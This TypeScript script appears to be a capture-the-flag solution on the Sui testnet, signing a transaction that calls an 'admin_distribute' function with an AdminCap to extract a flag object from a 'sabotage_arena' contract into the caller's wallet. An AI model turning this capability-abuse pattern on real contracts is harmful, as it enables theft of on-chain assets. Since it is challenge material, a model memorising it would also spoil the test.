import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
    network: 'testnet',
    baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const PACKAGE_ID = "0x936313e502e9cbf6e7a04fe2aeb4c60bc0acd69729acc7a19921b33bebf72d03";
const ARENA_ID = "0xd7dd51e3c156a0c0152cad6bc94884db5302979e78f04d631a51ab107f9449e6";
const ADMIN_CAP_ID = "0x08a31c97a7b533bd4e3cbdeeee0c7ab46ab3f26297aaf22a00db014d1ec4acb0";

(async () => {
    const address = keypair.getPublicKey().toSuiAddress();
    console.log(`Wallet: ${address}`);
    console.log(`Using AdminCap: ${ADMIN_CAP_ID}`);

    const tx = new Transaction();

    // Call the admin function to extract the flag directly
    const flag = tx.moveCall({
        target: `${PACKAGE_ID}::sabotage_arena::admin_distribute`,
        arguments: [
            tx.object(ARENA_ID),
            tx.object(ADMIN_CAP_ID)
        ],
    });

    // Transfer the extracted flag to your wallet
    tx.transferObjects([flag], address);

    console.log("Submitting transaction to claim flag via AdminCap...");

    try {
        const result = await suiClient.signAndExecuteTransaction({
            transaction: tx,
            signer: keypair,
            include: { effects: true },
        });

        const txData = result.Transaction ?? result.FailedTransaction ?? result;
        if ((txData as any).status?.success || (txData as any).effects?.status?.status === 'success') {
            console.log("✅ SUCCESS! Flag claimed using AdminCap!");
            console.log(`View on explorer: https://suiscan.xyz/testnet/tx/${(txData as any).digest}`);
        } else {
            console.error("❌ Transaction failed:", (txData as any).status?.error || (txData as any).effects?.status?.error);
            console.log("\nTip: If you get a type error, the arguments might be in reverse order (AdminCap, then Arena), or the function name might differ slightly.");
        }
    } catch (e: any) {
        console.error("Error executing transaction:", e.message || e);
    }
})();